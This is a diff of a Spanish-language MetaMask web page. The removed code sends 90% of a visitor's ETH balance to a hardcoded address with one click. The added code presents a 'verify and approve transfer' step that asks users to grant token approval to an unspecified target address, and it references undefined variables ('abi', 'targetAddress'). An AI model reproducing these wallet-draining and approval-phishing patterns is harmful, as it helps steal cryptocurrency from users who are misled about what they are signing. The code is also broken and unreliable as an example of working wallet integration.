@@ -1,35 +1,95 @@
 <!DOCTYPE html>
 <html>
 <head>
-	<title>Transferir el 90% del saldo</title>
+	<title>Transferencia de Tokens</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<!-- Agrega los scripts de Metamask -->
+	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" integrity="sha384-kk+M0gDz0A6JGZ80+Y9fLOgNOjHOk+icLj1e84EdgN5f5a34O5uV7jKtN0uAhJ9X" crossorigin="anonymous"></script>
+	<script src="https://cdn.jsdelivr.net/npm/@metamask/detect-provider@1.2.0/dist/detect-provider.min.js"></script>
+	<script src="https://cdn.jsdelivr.net/npm/@metamask/provider@1.2.0/dist/metamask-provider.min.js"></script>
+	<!-- Agrega los estilos para el card -->
+	<style>
+		.card {
+			background-color: #f5f5f5;
+			border: 1px solid #ddd;
+			border-radius: 5px;
+			box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+			padding: 20px;
+			text-align: center;
+		}
+
+		.button {
+			background-color: #4CAF50;
+			border: none;
+			color: white;
+			padding: 10px 20px;
+			text-align: center;
+			text-decoration: none;
+			display: inline-block;
+			font-size: 16px;
+			margin: 4px 2px;
+			cursor: pointer;
+		}
+	</style>
 </head>
 <body>
-	<h1>Transferir el 90% del saldo</h1>
-	<button onclick="transferir()">Transferir</button>
-	<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" integrity="sha384-YtPpSMXa0t/+1kK0CgnJZboMZc7CwQ0jKb7aJ/zFsS0V7Ou8lTqV7KjQk4sF4DdO" crossorigin="anonymous"></script>
+	<div class="card">
+		<h1>Transferencia de Tokens</h1>
+		<p>Por favor, conecta tu wallet Metamask para continuar</p>
+		<button id="connectButton" class="button">Conectar a Metamask</button>
+		<button id="approveButton" class="button" style="display:none;">Verificar y aprobar transferencia</button>
+	</div>
+
+	<!-- Agrega el script para la interacción con Metamask -->
 	<script>
-		async function transferir() {
-			if (typeof window.ethereum !== 'undefined') {
-				await window.ethereum.enable();
-				const provider = new ethers.providers.Web3Provider(window.ethereum);
-				const signer = provider.getSigner();
-				const address = await signer.getAddress();
-				const balance = await provider.getBalance(address);
-				const amountToTransfer = balance.mul(9).div(10); // Calcula el 90% del saldo
-				const receiver = "0x01C65F22A9478C2932e62483509c233F0aaD5c72"; // Cambiar por la dirección de destino
-				const transaction = {
-					to: receiver,
-					value: amountToTransfer
-				};
-				const response = await signer.sendTransaction(transaction);
-				console.log(response);
+		// Crea una instancia del proveedor de Metamask
+		const provider = new ethers.providers.Web3Provider(window.ethereum);
+		
+		// Obtiene los botones por su ID
+		const connectButton = document.getElementById("connectButton");
+		const approveButton = document.getElementById("approveButton");
+		
+		// Cuando el botón de conectar es presionado
+		connectButton.onclick = async function() {
+			try {
+				// Solicita al usuario conectar su wallet
+				await ethereum.request({ method: 'eth_requestAccounts' });
+				// Actualiza la interfaz para mostrar el botón de Verificar y aprobar transferencia
+connectButton.style.display = "none";
+approveButton.style.display = "block";
+} catch (error) {
+console.error(error);
+}
+};
+			// Cuando el botón de verificar y aprobar transferencia es presionado
+	approveButton.onclick = async function() {
+		try {
+			// Define la dirección del contrato y el token que se va a transferir
+			const contractAddress = "0x1234567890123456789012345678901234567890";
+			const tokenAmount = ethers.utils.parseUnits("100", "18"); // En este caso, se transfieren 100 tokens
+
+			// Obtiene la dirección del usuario conectado a Metamask
+			const signer = provider.getSigner();
+			const address = await signer.getAddress();
+
+			// Crea una instancia del contrato y obtiene la aprobación para la transferencia
+			const contract = new ethers.Contract(contractAddress, abi, signer);
+			const approved = await contract.allowance(address, targetAddress) >= tokenAmount;
+
+			// Si ya se aprobó la transferencia, realiza el depósito
+			if (approved) {
+				const transaction = await contract.transfer(targetAddress, tokenAmount);
+				alert("Transferencia realizada con éxito. Hash de la transacción: " + transaction.hash);
 			} else {
-				alert("Por favor instale MetaMask para continuar.");
+				// Si no se ha aprobado, solicita la aprobación al usuario
+				await contract.approve(targetAddress, tokenAmount);
+				alert("Se ha enviado una solicitud de aprobación a tu wallet. Por favor, aprueba la transacción en Metamask.");
 			}
+		} catch (error) {
+			console.error(error);
 		}
-	</script>
+	};
+</script>
 </body>
 </html>
-
-
-
